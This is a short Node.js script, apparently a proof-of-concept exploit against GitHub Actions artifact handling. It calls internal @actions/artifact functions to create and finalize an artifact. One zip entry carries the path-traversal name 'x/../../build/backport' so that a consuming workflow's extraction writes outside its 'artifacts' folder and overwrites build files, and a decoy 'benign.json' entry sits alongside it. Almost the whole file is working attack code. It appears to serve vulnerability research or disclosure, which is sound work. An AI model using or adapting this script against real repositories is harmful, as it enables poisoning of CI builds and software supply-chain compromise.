const fs = require('fs')
const path = require('path')

const A = '@actions/artifact'
const { createZipUploadStream } = require(`${A}/lib/internal/upload/zip`)
const { uploadZipToBlobStorage } = require(`${A}/lib/internal/upload/blob-upload`)
const { internalArtifactTwirpClient } = require(`${A}/lib/internal/shared/artifact-twirp-client`)
const { getBackendIdsFromToken } = require(`${A}/lib/internal/shared/util`)
const { StringValue } = require(`${A}/lib/generated`)

async function main() {
  const name = process.env.INPUT_NAME || 'pr-packages-999'
  const source = process.env.INPUT_SOURCE || 'poc-payload/backport'
  const target = process.env.INPUT_TARGET || 'build/backport'
  const workspace = process.env.GITHUB_WORKSPACE
  const sourcePath = path.join(workspace, source)
  // Consumer extracts with `path: artifacts` under the workspace; the entry
  // escapes that root to reach <workspace>/build/backport.
  const destinationPath = 'x/../../' + target
  console.log(`entry ${JSON.stringify(destinationPath)} -> ${path.join(workspace, 'artifacts', destinationPath)}`)
  const spec = [{ sourcePath, destinationPath, stats: fs.lstatSync(sourcePath) }]
  spec.push({ sourcePath, destinationPath: 'benign.json', stats: fs.lstatSync(sourcePath) })

  const backendIds = getBackendIdsFromToken()
  const client = internalArtifactTwirpClient()
  const createResp = await client.CreateArtifact({
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name, version: 4
  })
  if (!createResp.ok) throw new Error('CreateArtifact: response not ok')
  const zipStream = await createZipUploadStream(spec)
  const uploadResult = await uploadZipToBlobStorage(createResp.signedUploadUrl, zipStream)
  const finalizeReq = {
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name, size: uploadResult.uploadSize ? uploadResult.uploadSize.toString() : '0'
  }
  if (uploadResult.sha256Hash) finalizeReq.hash = StringValue.create({ value: `sha256:${uploadResult.sha256Hash}` })
  const finalizeResp = await client.FinalizeArtifact(finalizeReq)
  if (!finalizeResp.ok) throw new Error('FinalizeArtifact: response not ok')
  console.log(`artifact ${name} uploaded id=${finalizeResp.artifactId}`)
}
main().catch(e => { console.error(e); process.exit(1) })
